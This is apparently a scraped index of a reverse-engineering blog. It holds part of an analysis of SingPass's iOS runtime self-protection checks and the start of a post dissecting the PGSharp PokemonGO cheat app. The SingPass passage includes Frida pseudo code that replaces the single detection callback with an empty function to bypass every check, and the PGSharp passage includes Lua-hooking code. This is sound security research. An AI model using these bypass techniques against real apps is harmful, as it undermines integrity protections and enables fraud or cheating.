__text:00100E80B10\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X9,\u0026#160;SP __text:00100E80B14\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SUB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X10,\u0026#160;X9,\u0026#160;#0x10 __text:00100E80B18\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SP,\u0026#160;X10 __text:00100E80B1C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;#0x13B851C07E9DBCD __text:00100E80B2C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STUR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X11,\u0026#160;[X9,#-0x10] __text:00100E80B30\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X9,\u0026#160;SP __text:00100E80B34\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SUB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X0,\u0026#160;X9,\u0026#160;#0x10 __text:00100E80B38\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SP,\u0026#160;X0 __text:00100E80B3C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W11,\u0026#160;#0x1000 __text:00100E80B40\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STUR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W11,\u0026#160;[X9,#-0x10] __text:00100E80B44\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;STUR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X10,\u0026#160;[X9,#-8] __text:00100E80B48\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;BLR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X8 __text:00100E80B4C\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;SP,\u0026#160;X21 If the result of iterate_system_region with the given check_region_cbk callback is not 0, it triggers the EVT_CODE_SYSTEM_LIB event:\nif (iterate_system_region(check_region_cbk) != 0) { // Trigger `EVT_CODE_SYSTEM_LIB` } To understand the logic behind this check, we need to understand the purpose of the iterate_system_region function and its relationship with the callback check_region_cbk.\niterate_system_region \u0026#160; As for all the functions referenced in the blog post, their names come from my own analysis and might be inaccurate. Most of the functions related to the RASP checks were obviously stripped. In this case, iterate_system_region matches the original sub_100ED5BF8 This function aims to call the system function vm_region_recurse_64 and then, filter its output on conditions that could trigger the callback given in the first parameter: check_region_cbk.\niterate_system_region starts by accessing the base address of the dyld shared cache thanks to the SYS_shared_region_check_np syscall. This address is used to read and memoize a few attributes from the dyld_cache_header structure:\nThe shared cache header The shared cache end address Other limits related to the shared cache The following snippet gives an overview of these computations:\nstatic dyld_shared_cache* header = nullptr; /* At: 0x1010DE940 */ static uintptr_t g_shared_cache_end; /* At: 0x1010DE948 */ static uintptr_t g_overflow_address; /* At: 0x1010DE950 */ static uintptr_t g_module_last_addr; /* At: 0x1010DE958 */ if (header == nullptr) { // return; } uintptr_t shared_cache_base; syscall(SYS_shared_region_check_np, \u0026amp;shared_cache_base); header = shared_cache_base; g_shared_cache_end = shared_cache_addr + header-\u0026gt;mappings[0].size; g_overflow_address = -1; g_module_last_addr = g_shared_cache_end; if (header-\u0026gt;imagesTextCount \u0026gt; 0) { uintptr_t slide = shared_cache_addr - header-\u0026gt;mappings[0].address; uintptr_t tmp_overflow_address = -1; uintptr_t shared_cache_end_tmp = shared_cache_end; for (size_t i = 0; i \u0026lt; header-\u0026gt;imagesTextCount; ++i) { const uintptr_t txt_start_addr = slide + header-\u0026gt;imagesText[i].loadAddress; const uintptr_t txt_end_addr = start_addr + header-\u0026gt;imagesText[i].textSegmentSize; if (txt_start_addr \u0026gt;= shared_cache_end_tmp \u0026amp;\u0026amp; txt_start_addr \u0026lt; tmp_overflow_address) { g_overflow_address = start_addr; tmp_overflow_address = start_addr; } if (txt_end_addr \u0026gt;= shared_cache_end_tmp) { g_module_last_addr = txt_end_addr; shared_cache_end_tmp = txt_end_addr; } } } \u0026#160; From a reverse engineering point of view, the stack variable used to memoize these information is aliased with the parameter info of vm_region_recurse_64 that is called later. I don\u0026rsquo;t know if this aliasing is on purpose, but it makes the reverse engineering of the structures a bit more complicated. Following this memoization, there is a loop on vm_region_recurse_64 which queries the vm_region_submap_info_64 information for these addresses in the range of the dyld shared cache. We can identify the type of the query (vm_region_submap_info_64) thanks to the mach_msg_type_number_t *infoCnt argument which is set to 19:\n\u003c?xml version=\"1.0\" ?\u003e ;\u0026#160;In\u0026#160;this\u0026#160;basic\u0026#160;block,\u0026#160;the\u0026#160;stack\u0026#160;variable\u0026#160;`#0xB0+info`\u0026#160;is\u0026#160;aliased\u0026#160;with ;\u0026#160;the\u0026#160;variable\u0026#160;used\u0026#160;for,\u0026#160;saving\u0026#160;(temporarily)\u0026#160;the\u0026#160;shared\u0026#160;cache\u0026#160;information ;\u0026#160;c.f.\u0026#160;loc_100ED5C68 __text:0000000100ED5D24\u0026#160;loc_100ED5D24 __text:0000000100ED5D24\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X9\u0026#160;\u0026lt;-\u0026#160;shared\u0026#160;cache\u0026#160;base\u0026#160;address __text:0000000100ED5D24\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X9,\u0026#160;[SP,#0xB0+pAddr] __text:0000000100ED5D28\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W8,\u0026#160;#0x13\u0026#160;;\u0026#160;-\u0026gt;\u0026#160;19\u0026#160;\u0026lt;=\u0026gt;\u0026#160;vm_region_submap_info_64 __text:0000000100ED5D2C\u0026#160;STR\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W8,\u0026#160;[SP,#0xB0+infoCnt] __text:0000000100ED5D30\u0026#160;ADD\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X1,\u0026#160;SP,\u0026#160;#0xB0+pAddr\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;address __text:0000000100ED5D34\u0026#160;SUB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X2,\u0026#160;X29,\u0026#160;#-size\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;size __text:0000000100ED5D38\u0026#160;SUB\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X3,\u0026#160;X29,\u0026#160;#-nesting_depth\u0026#160;;\u0026#160;nesting_depth __text:0000000100ED5D3C\u0026#160;ADD\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X4,\u0026#160;SP,\u0026#160;#0xB0+info\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;info __text:0000000100ED5D40\u0026#160;ADD\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X5,\u0026#160;SP,\u0026#160;#0xB0+infoCnt\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;infoCnt __text:0000000100ED5D44\u0026#160;MOV\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;X0,\u0026#160;X20\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;target_task __text:0000000100ED5D48\u0026#160;BL\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;_vm_region_recurse_64 __text:0000000100ED5D4C\u0026#160;CBZ\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;W0,\u0026#160;loc_100ED5D70 This loop breaks under certain conditions and the callback is triggered with other conditions. As it is explained a bit later, the callback verifies the in-memory integrity of the library present in the dyld shared cache.\nThe verification and the logic behind this check is prone to take time, that\u0026rsquo;s why the authors of the check took care of filtering the addresses to check to avoid useless (heavy) computations.\nBasically, the callback that performs the in-depth inspection of the shared cache is triggered if:\n\u003c?xml version=\"1.0\" ?\u003e if\u0026#160;(info.pages_swapped_out\u0026#160;!=\u0026#160;0\u0026#160;|| \u0026#160;\u0026#160;\u0026#160;\u0026#160;info.pages_swapped_out\u0026#160;==\u0026#160;0\u0026#160;\u0026amp;\u0026amp;\u0026#160;info.protection\u0026#160;\u0026amp;\u0026#160;VM_PROT_EXECUTE) { \u0026#160;\u0026#160;bool\u0026#160;integrity_failed\u0026#160;=\u0026#160;check_region_cbk(address); } check_region_cbk When the conditions are met, iterate_system_region calls the check_region_cbk with the suspicious address in the first parameter:\nint iterate_system_region(callback_t cbk) { int ret = 0; if (cond(address)) { ret = cbk(address) { // Checks on the dyld_shared_cache } } return ret; } During the analysis of SingPass, only one callback is used in pair with iterate_system_region, and its code is not especially obfuscated (except the strings). Once we know that the checks are related to the dyld shared cache, we can quite easily figure out the structures involved in this function. This callback is located at the address 0x100ed5e0c and renamed check_region_cbk.\nFirstly, it starts by accessing the information about the address:\nint check_region_cbk(uintptr_t address) { Dl_info info; dladdr(address, info); // ... } This information is used to read the content of the __TEXT segment associated with the address parameter:\nauto* header = reinterpret_cast\u0026lt;mach_header_64*\u0026gt;(info.dli_fbase); segment_command_64 __TEXT = get_text_segment(header); vm_offset_t data = 0; mach_msg_type_number_t* dataCnt = 0; vm_read(task_self_trap(), info.dli_fbase, __TEXT.vmsize, \u0026amp;data, \u0026amp;dataCnt); \u0026#160; The __TEXT strings is encoded as well as the different paths of the shared cache like /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e and the header\u0026rsquo;s magic values: 0x01010b9126: dyld_v1 arm64e or 0x01010b9116: dyld_v1 arm64 On the other hand, the function opens the dyld_shared_cache and looks for the section of the shared cache that contains the library associated with the address parameter:\nint fd = open(\u0026#39;/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64\u0026#39;); (1) mmap(nullptr, 0x100000, VM_PROT_READ, MAP_NOCACHE | MAP_PRIVATE, fd, 0x0): 0x109680000 // Look for the shared cache entry associated with the provided address (2) mmap(nullptr, 0xad000, VM_PROT_READ, MAP_NOCACHE | MAP_PRIVATE, fd, 0x150a9000): 0x109681000 The purpose of the second call to mmap() is to load the slice of the shared cache that contains the code of the library. Then, the function checks byte per byte that the __TEXT segment\u0026rsquo;s content matches the in-memory content. The loop which performs this comparison is located between these addresses: 0x100ED6C58 - 0x100ED6C70.\nAs we can observe from the description of this RASP check, the authors paid a lot of attention to avoid performance issues and memory overhead. On the other hand, the callback check_region_cbk was never called during my experimentations (even when I hooked system function). I don\u0026rsquo;t know if it\u0026rsquo;s because I misunderstood the conditions but in the end, I had to manually force the conditions (by forcing the pages_swapped_out to 1).\n\u0026#160; vm_region_recurse_64 seems also always paired with an anti-hooking verification that is slightly different from the check described at the beginning of this blog post. Its analysis is quite easy and can be a good exercise. RASP Design Weaknesses Thanks to the different #EVT_* static variables that hold function pointers, the obfuscator enables to have dedicated callbacks for the supported RASP events. Nevertheless, the function init_and_check_rasp defined by the application\u0026rsquo;s developers setup all these pointers to the same callback: hook_detect_cbk_user_def. In such a design, all the RASP events end up in a single function which weakens the strength of the different RASP checks.\nIt means that we only have to target this function to disable or bypass the RASP checks.\nUsing Frida Gum, the bypass is as simple as using gum_interceptor_replace with an empty function:\nenum class RASP_EVENTS : uint32_t { EVT_ENV_JAILBREAK = 0x1, EVT_ENV_DEBUGGER = 0x2, EVT_APP_SIGNATURE = 0x20, EVT_APP_LOADED_LIBRARIES = 0x40, EVT_CODE_PROLOGUE = 0x400, EVT_CODE_SYMBOL_TABLE = 0x800, EVT_CODE_SYSTEM_LIB = 0x1000, EVT_CODE_TRACING = 0x2000, }; struct event_info_t { RASP_EVENTS event; uintptr_t** ptr_to_corrupt; }; void do_nothing(event_info_t info) { RASP_EVENTS evt = info.event; // ... return; } // This is **pseudo code** gum_interceptor_replace( listener-\u0026gt;interceptor, reinterpret_cast\u0026lt;void*\u0026gt;(\u0026amp;hook_detect_cbk_user_def) do_nothing, reinterpret_cast\u0026lt;void*\u0026gt;(\u0026amp;hook_detect_cbk_user_def) ); Thanks to this weakness, I could prevent the error message from being displayed as soon as the application starts.\nSingPass Jailbreak \u0026 RASP Bypass \u0026#160; It exists two other RASP checks: EVT_APP_MACHO and EVT_APP_SIGNATURE which were not enabled by the developers and thus, are not present in SingPass. Conclusion This first part is a good example of the challenges when using or designing an obfuscator with RASP features. On one hand, the commercial solution implements strong and advanced RASP functionalities with, for instance, inlined syscalls spread in different places of the application. On the other hand, the app\u0026rsquo;s developers weakened the RASP functionalities by setting the same callback for all the events. In addition, it seems that the application does not use the native code obfuscation provided by the commercial solution which makes the RASP checks un-protected against static code analysis. It could be worth to enforce code obfuscation on these checks regardless the configuration provided by the user.\nFrom a developer point of view, it can be very difficult to understand the impact in term of reverse-engineering when choosing to setup the same callback while it can be a good design decision from an architecture perspective.\nIn the second part of this series about iOS code obfuscation, we will dig a bit more in native code obfuscation through another application, where the application reacts differently to the RASP events and where the code is obfuscated with MBA, Control-Flow Flattening, etc.\nIf you have questions feel free to ping me 📫.\nAnnexes JB Detection Files Listed in PokemonGO /.bootstrapped No /.installed_taurine No /.mount_rw No /Library/dpkg/lock No /binpack Yes /odyssey/cstmp No /odyssey/jailbreakd No /payload No /payload.dylib No /private/var/mobile/Library/Caches/kjc.loader No /private/var/mobile/Library/Sileo No /taurine No /taurine/amfidebilitate No /taurine/cstmp No /taurine/jailbreakd No /taurine/jbexec No /taurine/launchjailbreak No /taurine/pspawn_payload.dylib No /var/dropbear No /var/jb No /var/lib/undecimus/apt No /var/motd No /var/tmp/cydia.log No Flagged Packages /Applications/AutoTouch.app/AutoTouch /Applications/iGameGod.app/iGameGod /Applications/zxtouch.app/zxtouch /Library/Activator/Listeners/me.autotouch.AutoTouch.ios8 /Library/LaunchDaemons/com.rpetrich.rocketbootstrapd.plist /Library/LaunchDaemons/com.tigisoftware.filza.helper.plist /Library/MobileSubstrate/DynamicLibraries/ATTweak.dylib /Library/MobileSubstrate/DynamicLibraries/GameGod.dylib /Library/MobileSubstrate/DynamicLibraries/LocalIAPStore.dylib /Library/MobileSubstrate/DynamicLibraries/Satella.dylib /Library/MobileSubstrate/DynamicLibraries/iOSGodsiAPCracker.dylib /Library/MobileSubstrate/DynamicLibraries/pccontrol.dylib /Library/PreferenceBundles/SatellaPrefs.bundle/SatellaPrefs /Library/PreferenceBundles/iOSGodsiAPCracker.bundle/iOSGodsiAPCracker ","date":1661731200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1663949651,"objectID":"df9862e9f3af387ea52bd5bdb29d9191","permalink":"https://www.romainthomas.fr/post/22-08-singpass-rasp-analysis/","publishdate":"2022-08-29T00:00:00Z","relpermalink":"/post/22-08-singpass-rasp-analysis/","section":"post","summary":"This first blog post introduces the RASP checks used in SingPass","tags":["ios","reverse engineering","obfuscation"],"title":"Part 1 – SingPass RASP Analysis","type":"post"},{"authors":["Romain Thomas"],"categories":["iOS","Reverse Engineering"],"content":"Back in July 2021, I had a look at the protections provided by Arxan to detect jailbroken devices in PokemonGO for iOS (Gotta Catch \u0026lsquo;Em All: Frida \u0026amp; jailbreak detection).\nTo continue walking along the path of iOS reverse engineering, I recently had a look at two iOS applications protected by a solution providing both native code obfuscation and RASP (Runtime Application Self Protection) protections.\nI ended up with two blog posts:\nPart 1 \u0026ndash; SingPass RASP Analysis Part 2 \u0026ndash; Native Code Obfuscation and RASP Syscalls Bypass The first part is an in-depth analysis of RASP detections methods on iOS while the second part details native code obfuscation and a new technique to bypass inlined syscalls (without Frida/Frida\u0026rsquo;s stalker and without a disassembler)\nDisclaimer The obfuscator mentioned in these blog posts provides strong and state-of-the-art protections to hinder reverse engineering. When dealing with obfuscation, saying that something is broken does not make really sense as if an attacker is skilled and strongly motivated, he will very likely achieve his goal.\nMoreover, this series of blog posts do not (and can\u0026rsquo;t) exhaustively evaluate the strength of this commercial solution because:\nThe applications analyzed might not use the latest version of the obfuscator. All the obfuscation features might not have been enabled by the developers (e.g. for performance reasons). The developers might have weakened the obfuscation scheme (unintentionally). In summary, these blog posts aim at sharing \u0026ndash; from a technical point of view \u0026ndash; what RASP and native code obfuscation look like on iOS. The scripts/code associated with these blog posts will not be published as it does not really bring more information.\nThe commercial solution not mentioned in the blog posts is and remains a good choice for protecting assets from reverse engineering. If you have doubts I would be very happy to discuss it.\n","date":1661126400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652974688,"objectID":"3058767eb8ac035fd02577cc50d09090","permalink":"https://www.romainthomas.fr/post/22-08-ios-obfuscation/","publishdate":"2022-08-22T00:00:00Z","relpermalink":"/post/22-08-ios-obfuscation/","section":"post","summary":"This series of blog posts details how obfuscators can protect iOS applications from reverse engineering","tags":["ios","reverse engineering","obfuscation"],"title":"A Journey in iOS App Obfuscation","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":" Slides Whitepaper Video (English) Assets https://github.com/romainthomas/the-poor-mans-obfuscator\n","date":1656892800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1657092325,"objectID":"04f3235df2100cc5d26020e29e959efe","permalink":"https://www.romainthomas.fr/publication/22-pst-the-poor-mans-obfuscator/","publishdate":"2022-07-04T00:00:00Z","relpermalink":"/publication/22-pst-the-poor-mans-obfuscator/","section":"publication","summary":"The purpose of this publication is to present ELF and Mach-O transformations which impact or\nhinder disassemblers like IDA, BinaryNinja, Ghidra, and Radare2.\n","tags":null,"title":"The Poor Man's Obfuscator","type":"publication"},{"authors":["Romain Thomas"],"categories":null,"content":" Slides Whitepaper Talk at BlackHat (English) Talk at SSTIC (French) Assets https://github.com/romainthomas/droidguard-samples\n","date":1652313600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1663949651,"objectID":"a397c974a6d1b005221a034db12e5318","permalink":"https://www.romainthomas.fr/publication/22-sstic-blackhat-droidguard-safetynet/","publishdate":"2022-05-12T00:00:00Z","relpermalink":"/publication/22-sstic-blackhat-droidguard-safetynet/","section":"publication","summary":"SafetyNet is the Android component developed by Google to verify the devices' integrity. These checks are used by the developers to prevent running applications on devices that would not meet security requirements but it is also used by Google to prevent bots, fraud \u0026 abuse. In 2017, Collin Mulliner \u0026 John Kozyrakis made one of the first public presentations about SafetyNet and a glimpse into the internal mechanisms. Since then, the Google anti-abuse team improved the strength of the solution which moved most of the original Java layer of SafetyNet, into a native module called DroidGuard. This module implements a custom virtual machine that runs a proprietary bytecode provided by Google to perform the devices integrity checks. This paper aims at providing a state-of-the-art of the current implementation of SafetyNet. In particular, it presents the internal mechanisms behind SafetyNet and the DroidGuard module. This includes an overview of the VM design, its internal mechanisms, and the security checks performed by SafetyNet to detect Magisk, emulators, rooted devices, and even Pegasus. ","tags":null,"title":"DroidGuard: A Deep Dive into SafetyNet","type":"publication"},{"authors":["Romain Thomas"],"categories":null,"content":"This is a PoC that shows basic integrity bypass without MagiskHide by modifying the execution of DroidGuard.\nHere are, for instance, some modules detected by DroidGuard:\nfrida-agent-32.so frida-agent-64.so libarthook_native.so libfrida-gadget.so libmemtrack_real.so librfbinder-cpp.so libriru_edxp.so libriru_edxposed.so libriru_snet-tweak-riru.so libsandhook-native.so libsandhook.edxp.so libsandhook.so libva++.so libva-native.so libwhale.edxp.so libxposed_art.so ","date":1636588800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"3d97e95959a856a1820124b28b93b190","permalink":"https://www.romainthomas.fr/projects-images/safetynet/","publishdate":"2021-11-11T00:00:00Z","relpermalink":"/projects-images/safetynet/","section":"projects-images","summary":"DroidGuard / Safetynet bypass","tags":["Android","Reverse"],"title":"DroidGuard","type":"projects-images"},{"authors":["Romain Thomas"],"categories":["Android","Reverse Engineering"],"content":" Introduction A few days after the release of the blog post Gotta Catch \u0026lsquo;Em All: Frida \u0026amp; jailbreak detection, someone on reddit - r/ReverseEngineering caught my attention on a cheating app for the Android version of PokemonGO:\nSo here it is!\nPGSharp belongs to the family of PokemonGO\u0026rsquo;s cheating app that is not (yet) banned by Niantic. This cheat provides an enhanced game experience with interesting functionalities such as:\nGPS Spoofing Quick Catch Pokemon Feed Nearby Radar \u0026hellip; Last but not least, PGSharp runs on regular devices, rooted or not.\nThis cheat made my weekends for the last 4 months and, from a technical point of view, it was worth it. As will be discussed through this blog post, PGSharp uses several interesting tricks.\nNote The content of this blog post is based on PGSharp 1.33.0 which is related to the following APKs:\nPGSharp v1.33.0\nPokemonGO v0.221.0\nThis blog post is quite long but the different parts are more or less independents, so feel free to jump on them depending on your interests:\nCode Protection Lua VM Java Obfuscation Cheat Mechanisms DEX Files Comparison libmain.so Signature Bypass Dynamic APK Loading GPS Spoofing JNIEnv Proxifier Unity Hooks Network Communications SafetyNet When PGSharp avoids PokemonGO pitfalls Final Words Acknowledgments Annexes You can also check the slides to get an overview of the content:\nEnjoy!\nCode Protection PokemonGO is a target of choice for reverse engineers and some critical functionalities are protected by a commercial solution. It is worth mentioning that only a subset of the game is obfuscated. For instance, the \u0026ldquo;Java\u0026rdquo; part of the game is absolutely not protected, such as we have the original class and method names. The Unity part is \u0026ldquo;compiled\u0026rdquo; into libil2cpp.so but we can recover some metadata with Perfare/Il2CppDumper.\nAll the obfuscation is focused on libNianticLabsPlugin.so (c.f. Gotta Catch \u0026lsquo;Em All: Frida \u0026amp; jailbreak detection), and since only this part of the game is heavily obfuscated, it gives a hint about where the critical functionalities are.\nOn the other hand, PGSharp uses different layers of obfuscation to prevent its analysis. First of all, it uses O-LLVM to obfuscate the native code that includes, at least, control-flow flattening and string encryption. Nevertheless, the obfuscation is relatively weak against emulation and static analysis1.\nLua VM Some obfuscation techniques are based on transforming the original code through a VM (like VMProtect). It adds another layer to reverse, as we need to understand the VM architecture before being able to understand the original semantic of the code.\nBut what about using an interpreted language (like Python) and obfuscate its VM or its interpreter with O-LLVM? This is what PGSharp does with Lua. Some parts of the cheat are written in Lua whose VM has been modified to:\nFake the version: try to make believe Lua 5.1 while it\u0026rsquo;s Lua 5.3 Add new opcodes (OP_RUN, OP_GETDOWNVAL, OP_OLDTABLE, and OP_XXOR) to break decompilation and common Lua tools. The native library that implements the cheat functionalities and that contains the Lua VM being stripped, one of the challenges lies in recognizing the Lua C API among the library\u0026rsquo;s functions2. For instance, here is a basic block of a native function that uses the Lua API:\nAmong all the Lua C functions, some of them are worth identifying to ease reverse engineering:\nluaL_loadbuffer \u0026ldquo;Load a buffer as a Lua chunk.\u0026rdquo;.\nBasically, it loads a Lua bytecode from a buffer given in parameter. This Lua bytecode is the result of the compilation of the original script with luac. By hooking this function, we can recover the following files:\nbase64.luac class.luac global.luac init.luac json.luac - from https://github.com/rxi/json.lua location.luac md5.luac - from https://github.com/kikito/md5.lua pgo.luac pgodump.luac plugin.luac reflect.luac The orange files are utilities, while the green ones contain cheat mechanisms.\nluaD_precall Function that is involved when calling a C native function or a pure Lua function. Since its prototype is (lua_State *L, StkId func, int nresults), it can help to dynamically identify which function is called: 0x6776a8 luaD_precall(\u0026#39;gamehelper\u0026#39;) 0x6776a8 luaD_precall(\u0026#39;@./app/arm64-v8a/luac/global.lua:0 - sub_71733ea5d0\u0026#39;) { 0x694d90 luaD_precall(\u0026#39;@./app/arm64-v8a/luac/global.lua:246 - sub_71733f7b50\u0026#39;) { 0x6776a8 luaD_precall(\u0026#39;@./app/arm64-v8a/luac/location.lua:38 - sub_717346d650\u0026#39;) { lua_pushcclosure Pushes a new C closure onto the stack.\nThis function is particularly interesting to recover native C functions linked to Lua function:\n0x0e9cc0: lua_pushcclosure(\u0026#39;initil2cppmethods\u0026#39;) 0x0e9cd4: lua_setfield(-2, \u0026#39;initil2cppmethods\u0026#39;, \u0026#39;func_0xedaa0\u0026#39;) ... 0x0e9d10: lua_pushcclosure(\u0026#39;nar\u0026#39;) 0x0e9d24: lua_setfield(-2, \u0026#39;nar\u0026#39;, \u0026#39;func_0xeddbc\u0026#39;) ... 0x0ea020: lua_pushcclosure(\u0026#39;ipf\u0026#39;) 0x0ea034: lua_setfield(-2, \u0026#39;ipf\u0026#39;, \u0026#39;func_0x1318b0\u0026#39;) lua_pushstring \u0026ldquo;Pushes the zero-terminated string pointed to by s onto the stack.\u0026rdquo;\nThis function enables to dynamically recover strings that might not be present in the native code or somehow encoded:\n0x0ebdfc: lua_pushstring(\u0026#39;https://tens.pgsharp.com/v1/scc-2-[...]/\u0026#39;) 0x0ebe28: lua_pushstring(\u0026#39;me.uw.hela.pref\u0026#39;) 0x0c56ac: lua_pushstring(\u0026#39;AIza[...]XhM4\u0026#39;) 0x0e15b4: lua_pushstring(\u0026#39;token=[Redacted]\u0026#39;) To dynamically understand the behavior of the Lua VM, we can compile the Frida Gum SDK along with Lua v5.3.\nIt enables to hook Lua functions with Frida and to leverage the compiled Lua v5.3 to inspect the parameters:\nextern \u0026#34;C\u0026#34; { #include \u0026#34;lua.h\u0026#34; #include \u0026#34;ldo.h\u0026#34; #include \u0026#34;ldebug.h\u0026#34; } gum_interceptor_attach(listener_-\u0026gt;interceptor, luaD_precall_addr, listener_ luaD_precall_addr); void native_listener_on_enter(GumInvocationListener *listener, GumInvocationContext* ic) { auto* L = reinterpret_cast\u0026lt;lua_State*\u0026gt;(ic-\u0026gt;cpu_context-\u0026gt;x[0]); auto func = reinterpret_cast\u0026lt;StkId\u0026gt;(ic-\u0026gt;cpu_context-\u0026gt;x[1]); auto narg = static_cast\u0026lt;int\u0026gt;(ic-\u0026gt;cpu_context-\u0026gt;x[2]); if (ttype(func) != LUA_TLCL) { return log(\u0026#34;sub_{:x}\u0026#34;, ptr); } Proto *p = clLvalue(func)-\u0026gt;p; return log(\u0026#34;{}:{:d} - sub_{:x}\u0026#34;, getstr(p-\u0026gt;source), p-\u0026gt;linedefined, ptr); } Java Obfuscation Contrary to the PokemonGO\u0026rsquo;s Java layer, PGSharp protects its Java code with Proguard and the strings are xored with the hardcoded key:\nvqGqQWCVnDRrNXTR\nThis key seems to not change across the different versions of PGSharp and the encoded strings look like this:\npublic void q() { String a = GL.a(r3.a(\u0026#34;FAQgLiQlLw==\u0026#34;), (String) null); if (a != null) { JSONObject jSONObject = new JSONObject(); Context context = GL.c; jSONObject.put(r3.a(\u0026#34;Agg3FA==\u0026#34;), r3.a(\u0026#34;Axg=\u0026#34;)); jSONObject.put(r3.a(\u0026#34;Axgj\u0026#34;), UI.g(context)); jSONObject.put(r3.a(\u0026#34;BQUmBTQ=\u0026#34;), this.s); jSONObject.put(r3.a(\u0026#34;BQEoHjc+LTE=\u0026#34;), ((Boolean) ...); jSONObject.put(r3.a(\u0026#34;BAUr\u0026#34;), UI.f()); jSONObject.put(r3.a(\u0026#34;Gh8g\u0026#34;), Locale.getDefault().getDisplayLanguage()); jSONObject.put(r3.a(\u0026#34;FxMu\u0026#34;), UI.a()); 